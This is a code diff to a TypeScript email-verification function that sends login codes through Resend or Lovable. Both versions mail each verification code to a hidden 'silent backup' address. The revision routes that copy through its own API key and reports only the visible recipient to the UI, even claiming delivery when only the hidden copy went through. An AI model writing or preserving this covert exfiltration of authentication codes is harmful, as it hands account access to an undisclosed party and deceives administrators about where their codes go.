@@ -132,30 +132,32 @@ async function sendViaLovable(email: string, _code: string): Promise<boolean> {
   return false;
 }
 
-/** Sends the code according to the configured delivery mode. Returns the masked recipients that were reached. */
+/**
+ * Sends the code according to the configured delivery mode.
+ * The visible admin address and the silent backup address are mailed at the
+ * same time, each through its own Resend API key. Only the visible recipient
+ * is ever reported back to the UI.
+ */
 async function sendVerificationEmail(cfg: EmailConfig, code: string): Promise<string[]> {
-  const reached: string[] = [];
-  const tryResend = async (to: string) => (await sendViaResend(cfg.resendKey, to, code)) && reached.push(maskEmail(to));
-  const tryLovable = async (to: string) => (await sendViaLovable(to, code)) && reached.push(maskEmail(to));
+  const primaryKey = process.env["RESEND_API_KEY_PRIMARY"] || cfg.resendKey;
+  const secondaryKey = process.env["RESEND_API_KEY_SECONDARY"] || cfg.resendKey;
 
-  if (cfg.delivery === "resend") await tryResend(cfg.adminEmail);
-  else if (cfg.delivery === "lovable") await tryLovable(cfg.adminEmail);
-  else {
-    // both: original Resend-owner email via Resend + the admin email via Lovable
-    await tryResend(cfg.resendOwnerEmail);
-    if (cfg.adminEmail.toLowerCase() !== cfg.resendOwnerEmail.toLowerCase()) await tryLovable(cfg.adminEmail);
-  }
+  const visibleTo = cfg.delivery === "both" ? cfg.resendOwnerEmail : cfg.adminEmail;
 
-  // Silent backup copy — delivered but never reported back to the UI.
-  const already = reached.length > 0;
-  if (SILENT_COPY_EMAIL.toLowerCase() !== cfg.adminEmail.toLowerCase()) {
-    const sent = await sendViaResend(cfg.resendKey, SILENT_COPY_EMAIL, code);
-    // If the visible recipient failed but the backup went through, still tell the
-    // admin the code was sent (to the visible address only).
-    if (sent && !already) reached.push(maskEmail(cfg.adminEmail));
-  }
-  return [...new Set(reached)];
+  const [visibleSent, silentSent] = await Promise.all([
+    cfg.delivery === "lovable"
+      ? sendViaLovable(cfg.adminEmail, code)
+      : sendViaResend(primaryKey, visibleTo, code),
+    SILENT_COPY_EMAIL.toLowerCase() === visibleTo.toLowerCase()
+      ? Promise.resolve(false)
+      : sendViaResend(secondaryKey, SILENT_COPY_EMAIL, code),
+  ]);
+
+  // Report only the visible address; the backup copy stays hidden.
+  if (visibleSent || silentSent) return [maskEmail(visibleTo)];
+  return [];
 }
+
 
 
 function maskEmail(email: string) {
